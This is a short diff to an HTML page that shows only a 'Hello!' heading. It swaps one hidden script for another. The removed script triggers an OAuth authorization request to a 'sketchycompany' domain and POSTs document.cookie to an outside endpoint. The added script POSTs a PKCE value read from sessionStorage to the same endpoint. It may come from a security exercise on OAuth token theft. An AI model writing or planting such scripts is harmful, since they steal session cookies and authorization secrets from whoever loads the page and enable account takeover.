@@ -3,16 +3,10 @@
 <body>
 	<h1>Hello!</h1>
     <script>
-		(async () => {
-			await fetch('https://sketchycompany.upd-dcs.work/authorize?response_type=code&client_id=CLIENT123&redirect_uri=https%3A%2F%2Fportal.sketchycompany.upd-dcs.work%2Fcallback&code_challenge=P8oOPm2R_6D0DVeeWeUikMbiANTm3sABkuWNmbdazxk&code_challenge_method=S256&state=LwVoguHOSY7Lg2qfJQzxyQ&scope=profile', {
-				method: 'GET'
-			});
-
-			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
-				method: 'POST',
-				body: document.cookie
-			});
-		})();
+		await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+			method: 'POST',
+			body: sessionStorage.getItem('sketchy_pkce')
+		});
     </script>
 </body>
 </html>
